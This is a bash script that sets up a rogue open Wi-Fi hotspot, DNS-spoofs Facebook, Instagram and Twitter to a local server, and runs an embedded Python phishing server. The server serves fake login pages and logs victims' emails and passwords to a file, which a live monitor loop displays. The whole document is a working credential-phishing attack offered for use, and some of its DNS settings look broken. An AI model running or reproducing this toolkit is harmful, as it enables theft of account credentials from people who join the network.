#!/bin/bash
# 🔴 HOTSPOT FINAL - WITH ETHERNET INTERNET SHARING
# 💀 ZXZBEDST VERIFIED - PERFECT PHISHING + INTERNET

RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BRIGHT_RED}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_RED}║  ███╗   ███╗███████╗██╗  ██╗██╗   ██╗███████╗ █████╗ ██╗  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ████╗ ████║╚══███╔╝██║ ██╔╝╚██╗ ██╔╝╚══███╔╝██╔══██╗██║ ██╔╝   ║${NC}"
echo -e "${BRIGHT_RED}║  ██╔████╔██║  ███╔╝ █████╔╝  ╚████╔╝   ███╔╝ ███████║█████╔╝    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║╚██╔╝██║ ███╔╝  ██╔═██╗   ╚██╔╝   ███╔╝  ██╔══██║██╔═██╗    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║ ╚═╝ ██║███████╗██║  ██╗   ██║   ███████╗██║  ██║██║  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╗  ██╗ ██████╗ ████████╗████████╗          ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║██╔═══██╗╚══██╔══╝╚══██╔══╝          ║${NC}"
echo -e "${BRIGHT_RED}║                    ███████║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╔══██║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║╚██████╔╝   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝             ║${NC}"
echo -e "${BRIGHT_RED}╚═══════════════════════════════════════════════════════╝${NC}"
echo -e "${BRIGHT_RED}[🔥] MZKYZAK HOTSPOT - WITH ETHERNET INTERNET SHARING${NC}"
echo -e "${BRIGHT_RED}[💀] Perfect Phishing + Real Internet Access${NC}"
echo ""

# ================================================================
# 1. DETECT ETHERNET INTERFACE
# ================================================================
echo -e "${GREEN}[1] Detecting network interfaces...${NC}"

ETH_INTERFACE=$(ip link show | grep -E "eth[0-9]|enp[0-9]s[0-9]" | awk -F: '{print $2}' | tr -d ' ' | head -1)

if [ -z "$ETH_INTERFACE" ]; then
    echo -e "${BRIGHT_RED}❌ No ethernet interface found!${NC}"
    echo -e "${YELLOW}Available interfaces:${NC}"
    ip link show | grep "^[0-9]" | awk -F: '{print $2}' | tr -d ' '
    echo ""
    echo -e "${YELLOW}Running in STANDALONE mode (no internet sharing)${NC}"
    INTERNET_MODE="standalone"
else
    echo -e "${GREEN}✓ Ethernet interface found: $ETH_INTERFACE${NC}"
    INTERNET_MODE="with_internet"
fi

# ================================================================
# 2. STOP NETWORK SERVICES
# ================================================================
echo -e "${GREEN}[2] Stopping network services...${NC}"
sudo systemctl stop NetworkManager 2>/dev/null
sudo systemctl stop wpa_supplicant 2>/dev/null
sleep 2

# ================================================================
# 3. CONFIGURE WLAN0
# ================================================================
echo -e "${GREEN}[3] Configuring wlan0...${NC}"
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

# ================================================================
# 4. ENABLE INTERNET SHARING (IF ETHERNET AVAILABLE)
# ================================================================
if [ "$INTERNET_MODE" = "with_internet" ]; then
    echo -e "${GREEN}[4] Enabling internet sharing via $ETH_INTERFACE...${NC}"
    
    # Enable IP forwarding
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    
    # Configure NAT
    sudo iptables -t nat -F
    sudo iptables -F
    sudo iptables -t nat -A POSTROUTING -o $ETH_INTERFACE -j MASQUERADE
    sudo iptables -A FORWARD -i $ETH_INTERFACE -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i wlan0 -o $ETH_INTERFACE -j ACCEPT
    
    echo -e "${GREEN}✓ Internet sharing enabled${NC}"
else
    echo -e "${YELLOW}[4] Running in standalone mode (no internet sharing)${NC}"
fi

# ================================================================
# 5. START ROGUE ACCESS POINT
# ================================================================
echo -e "${GREEN}[5] Starting rogue access point...${NC}"
echo -e "${GREEN}  SSID: mzkyzak_hotspot${NC}"
echo -e "${GREEN}  Channel: 6${NC}"
echo -e "${GREEN}  Security: Open (no password)${NC}"

sudo hostapd setup/hostapd_simple.conf &
HOSTAPD_PID=$!
sleep 3

# ================================================================
# 6. START DNSMASQ WITH SMART CONFIG
# ================================================================
echo -e "${GREEN}[6] Starting DNS/DHCP server...${NC}"

cat > /tmp/dnsmasq_smart.conf << EOF
interface=wlan0
listen-address=192.168.1.1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# Smart DNS handling
$([ "$INTERNET_MODE" = "with_internet" ] && echo "server=8.8.8.8" || echo "# No upstream DNS")
$([ "$INTERNET_MODE" = "with_internet" ] && echo "server=8.8.4.4" || echo "# No upstream DNS")

# Spoof specific domains to our phishing page
address=/facebook.com/192.168.1.1
address=/www.facebook.com/192.168.1.1
address=/m.facebook.com/192.168.1.1
address=/instagram.com/192.168.1.1
address=/www.instagram.com/192.168.1.1
address=/twitter.com/192.168.1.1
address=/www.twitter.com/192.168.1.1

# For standalone mode, redirect everything
$([ "$INTERNET_MODE" = "standalone" ] && echo "address=/#/192.168.1.1" || echo "# Selective spoofing")

# Disable IPv6 to avoid errors
no-dhcp-interface=wlan0
filter-AAAA
filter-A

# Logging
log-queries
log-dhcp
log-facility=/tmp/dnsmasq_hotspot.log
EOF

sudo dnsmasq -C /tmp/dnsmasq_smart.conf -d &
DNSMASQ_PID=$!
sleep 2

# ================================================================
# 7. START PHISHING WEB SERVER
# ================================================================
echo -e "${GREEN}[7] Starting phishing web server...${NC}"

cat > /tmp/phishing_server_final.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import json
import os

CREDENTIALS_FILE = "/tmp/hotspot_credentials.log"
ACCESS_FILE = "/tmp/hotspot_access.log"

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log access
        client_ip = self.client_address[0]
        self.log_access(client_ip, self.path)
        
        # Handle captive portal detection
        if self.path in ['/generate_204', '/hotspot-detect.html', '/library/test/success.html']:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return
        
        # Serve phishing page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Dynamic phishing page based on domain
        phishing_page = self.get_phishing_page(self.path)
        self.wfile.write(phishing_page.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        if 'application/json' in self.headers.get('Content-Type', ''):
            data = json.loads(post_data)
            email = data.get('email', '')
            password = data.get('password', '')
        else:
            parsed = urllib.parse.parse_qs(post_data)
            email = parsed.get('email', [''])[0]
            password = parsed.get('password', [''])[0]
        
        # Log credentials
        if email or password:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(CREDENTIALS_FILE, "a") as f:
                f.write(f"[{timestamp}] FROM: {self.path}\n")
                f.write(f"  IP: {self.client_address[0]}\n")
                f.write(f"  Email: {email}\n")
                f.write(f"  Password: {password}\n")
                f.write("-" * 50 + "\n")
            
            print(f"[💀] CREDENTIALS CAPTURED: {email}")
        
        # Redirect to success
        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()
    
    def get_phishing_page(self, path):
        # Determine which phishing page to show based on likely intent
        if 'facebook' in path.lower():
            return self.facebook_phishing()
        elif 'instagram' in path.lower():
            return self.instagram_phishing()
        else:
            return self.generic_wifi_phishing()
    
    def facebook_phishing(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Facebook Login - WiFi Access</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>body{font-family:Arial;background:#f0f2f5;padding:20px;}
        .box{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
        .logo{color:#1877f2;font-size:40px;text-align:center;font-weight:bold;margin-bottom:20px;}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;}
        button{width:100%;background:#1877f2;color:white;border:none;padding:14px;border-radius:6px;font-size:16px;cursor:pointer;}
        .success{background:#42b72a;color:white;padding:15px;border-radius:6px;text-align:center;margin-top:20px;display:none;}</style>
        </head>
        <body>
            <div class="box">
                <div class="logo">facebook</div>
                <h2 style="text-align:center">Log in to access WiFi</h2>
                <form id="loginForm">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                <div id="success" class="success">✓ Connected to WiFi!</div>
            </div>
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e){
                    e.preventDefault();
                    fetch('/submit', {
                        method: 'POST',
                        body: new FormData(this)
                    });
                    document.getElementById('success').style.display = 'block';
                    setTimeout(() => window.location.href = 'http://www.google.com', 2000);
                });
            </script>
        </body>
        </html>
        '''
    
    def generic_wifi_phishing(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Free WiFi Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>body{font-family:Arial;background:#f0f2f5;padding:20px;}
        .box{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
        .wifi{font-size:60px;text-align:center;color:#1877f2;margin-bottom:20px;}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;}
        button{width:100%;background:#1877f2;color:white;border:none;padding:14px;border-radius:6px;font-size:16px;cursor:pointer;}</style>
        </head>
        <body>
            <div class="box">
                <div class="wifi">📶</div>
                <h2 style="text-align:center">Free WiFi Login</h2>
                <p style="text-align:center;color:#666">Enter social media credentials to connect</p>
                <form id="loginForm">
                    <input type="text" name="email" placeholder="Email or username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Connect to WiFi</button>
                </form>
            </div>
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e){
                    e.preventDefault();
                    fetch('/submit', {method: 'POST', body: new FormData(this)});
                    alert('Connecting to WiFi...');
                    setTimeout(() => window.location.href = 'http://www.google.com', 1500);
                });
            </script>
        </body>
        </html>
        '''
    
    def instagram_phishing(self):
        return self.generic_wifi_phishing().replace('Free WiFi Login', 'Instagram WiFi Login')
    
    def log_access(self, ip, path):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ACCESS_FILE, "a") as f:
            f.write(f"[{timestamp}] {ip} - {path}\n")

print("[🔥] Final Phishing Server Starting...")
print(f"[📁] Credentials: {CREDENTIALS_FILE}")
print(f"[📁] Access log: {ACCESS_FILE}")

server = HTTPServer(('192.168.1.1', 80), PhishingHandler)
server.serve_forever()
EOF

chmod +x /tmp/phishing_server_final.py
sudo python3 /tmp/phishing_server_final.py &
SERVER_PID=$!
sleep 2

# ================================================================
# 8. FINAL STATUS AND MONITORING
# ================================================================
echo ""
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo -e "${BRIGHT_RED}[✅] FINAL HOTSPOT SYSTEM ACTIVE!${NC}"
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}📡 Hotspot: ${NC}mzkyzak_hotspot"
echo -e "${GREEN}🔓 Security: ${NC}Open network"
echo -e "${GREEN}🌐 Internet Mode: ${NC}$INTERNET_MODE"
echo -e "${GREEN}🎯 Phishing Targets: ${NC}Facebook, Instagram, Twitter"
echo ""
echo -e "${GREEN}📊 Monitoring:${NC}"
echo -e "  • Credentials: tail -f /tmp/hotspot_credentials.log"
echo -e "  • Access log: tail -f /tmp/hotspot_access.log"
echo -e "  • DNS queries: tail -f /tmp/dnsmasq_hotspot.log"
echo -e "  • Connected clients: sudo arp -a | grep wlan0"
echo ""
echo -e "${GREEN}⚡ Quick Commands:${NC}"
echo -e "  tail -f /tmp/hotspot_credentials.log"
echo -e "  sudo arp -a"
echo ""
echo -e "${BRIGHT_RED}Press Ctrl+C to stop everything${NC}"

# ================================================================
# 9. MONITOR LOOP
# ================================================================
trap 'cleanup' INT

cleanup() {
    echo ""
    echo -e "${BRIGHT_RED}[!] Stopping final hotspot system...${NC}"
    
    sudo kill $HOSTAPD_PID $DNSMASQ_PID $SERVER_PID 2>/dev/null
    
    # Clean iptables
    sudo iptables -t nat -F
    sudo iptables -F
    
    # Restore network
    sudo ifconfig wlan0 down
    sudo iwconfig wlan0 mode managed
    sudo ifconfig wlan0 up
    
    sudo systemctl start NetworkManager 2>/dev/null
    sudo systemctl start wpa_supplicant 2>/dev/null
    
    echo ""
    echo -e "${GREEN}[✓] System stopped. Network restored.${NC}"
    echo -e "${GREEN}[📁] Credentials: /tmp/hotspot_credentials.log${NC}"
    echo -e "${GREEN}[📁] Access log: /tmp/hotspot_access.log${NC}"
    echo ""
    echo -e "${BRIGHT_RED}[💀] Operation complete! Check captured data.${NC}"
    exit 0
}

# Monitor loop
while true; do
    sleep 10
    clear
    
    echo -e "${BRIGHT_RED}════════════════════════════════��═══════════${NC}"
    echo -e "${BRIGHT_RED}[🔥] HOTSPOT MONITOR - $(date '+%H:%M:%S')${NC}"
    echo -e "${BRIGHT_RED}════════════════════════════════════════════${NC}"
    echo ""
    
    # Connected clients
    echo -e "${GREEN}[📱] Connected Clients:${NC}"
    sudo arp -a | grep wlan0 2>/dev/null || echo "  None"
    echo ""
    
    # Captured credentials
    echo -e "${GREEN}[💀] Captured Credentials:${NC}"
    if [ -f "/tmp/hotspot_credentials.log" ]; then
        CRED_COUNT=$(grep -c "CREDENTIALS CAPTURED" /tmp/hotspot_credentials.log 2>/dev/null || echo "0")
        echo "  Total: $CRED_COUNT"
        tail -3 /tmp/hotspot_credentials.log 2>/dev/null | grep -A 2 "FROM:" || echo "  None yet"
    else
        echo "  None yet"
    fi
    echo ""
    
    echo -e "${YELLOW}[⏱️ ] Refreshing in 10 seconds...${NC}"
done